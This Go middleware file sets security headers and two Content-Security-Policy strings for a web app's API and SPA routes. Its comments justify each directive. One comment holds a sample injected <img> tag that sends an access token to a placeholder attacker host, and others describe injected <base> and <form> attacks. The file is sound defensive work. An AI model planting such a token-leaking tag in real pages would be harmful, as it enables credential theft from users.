package middleware

import (
	"net/http"
	"strings"
)

// SecurityHeaders adds security headers to every response.
// When serveFrontend is true, a permissive CSP is used for frontend routes
// so the embedded Vue SPA can load its assets.
func SecurityHeaders(serveFrontend bool) func(http.Handler) http.Handler {
	// object-src, base-uri and form-action are spelled out in both policies
	// rather than left to default-src (ASVS V3.4.3). base-uri and form-action
	// have no fallback at all — neither is a fetch directive — so without them
	// an injected <base> re-points every relative URL on the page and an
	// injected <form> posts a credential off-origin, while default-src 'self'
	// reports itself satisfied. object-src falls back to default-src only on CSP
	// Level 3 browsers, which is not a property to inherit a plugin surface from.
	//
	// img-src carries no https: source. It used to, and nothing in web/dist
	// needs it: the only <img> the SPA renders is the TOTP QR code, which is a
	// data: URL. A wildcard image source is a working exfiltration channel for
	// an injected <img src="https://attacker/?t=..."> in an application that
	// deliberately holds its access token in JavaScript memory.
	//
	// TestServedPolicyIsNeverWeakerThanTheNginxImage compares every directive
	// here against web/nginx.conf, which configures the optional standalone
	// frontend image. This policy is the one a default deployment actually
	// serves, so it must never be the weaker of the two.
	apiCSP := "default-src 'none'; frame-ancestors 'none'; object-src 'none'; base-uri 'none'; form-action 'none'"
	frontendCSP := "default-src 'self'; frame-ancestors 'none'; script-src 'self'; style-src 'self'; connect-src 'self'; img-src 'self' data:; font-src 'self'; object-src 'none'; base-uri 'none'; form-action 'self'"

	return func(next http.Handler) http.Handler {
		return http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
			w.Header().Set("Strict-Transport-Security", "max-age=31536000; includeSubDomains; preload")
			w.Header().Set("X-Content-Type-Options", "nosniff")
			w.Header().Set("X-Frame-Options", "DENY")
			w.Header().Set("X-XSS-Protection", "0")
			w.Header().Set("Referrer-Policy", "no-referrer")
			w.Header().Set("Cache-Control", "no-store")
			w.Header().Set("Pragma", "no-cache")
			// publickey-credentials-get / -create are named explicitly rather
			// than left to the browser default, so the WebAuthn surface is
			// pinned to this origin by the policy instead of by whatever a
			// future browser decides the default should be.
			w.Header().Set("Permissions-Policy",
				"camera=(), microphone=(), geolocation=(), payment=(), publickey-credentials-get=(self), publickey-credentials-create=(self)")
			w.Header().Set("Cross-Origin-Opener-Policy", "same-origin")
			w.Header().Set("Cross-Origin-Resource-Policy", "same-origin")

			// Use relaxed CSP for frontend routes, strict API CSP for all API endpoints
			isAPI := strings.HasPrefix(r.URL.Path, "/auth/") ||
				strings.HasPrefix(r.URL.Path, "/client/") ||
				strings.HasPrefix(r.URL.Path, "/user/") ||
				strings.HasPrefix(r.URL.Path, "/admin/") ||
				strings.HasPrefix(r.URL.Path, "/.well-known/") ||
				r.URL.Path == "/healthz" ||
				r.URL.Path == "/readyz"
			if serveFrontend && !isAPI {
				w.Header().Set("Content-Security-Policy", frontendCSP)
			} else {
				w.Header().Set("Content-Security-Policy", apiCSP)
			}

			next.ServeHTTP(w, r)
		})
	}
}
